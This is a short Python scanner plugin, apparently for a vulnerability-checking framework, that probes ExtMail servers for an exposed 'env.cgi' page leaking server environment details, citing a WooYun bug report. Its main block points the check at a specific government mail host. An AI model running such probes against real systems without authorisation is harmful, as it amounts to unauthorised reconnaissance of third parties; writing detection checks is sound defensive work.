#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer http://www.wooyun.org/bugs/wooyun-2012-04854

def assign(service, arg): 
    if service == "extmail":
        return True, arg
		
def audit(arg): 
    payload = 'extmail/cgi/env.cgi'
    code, head, res, errcode, _ = curl.curl2(arg+payload)
    if code == 200 and 'SERVER_ADMIN' in res:
        security_info(arg+payload)        
				
if __name__ == '__main__': 
    from dummy import *
    audit(assign('extmail', 'http://mail.ca.suzhou.gov.cn/')[1])
	
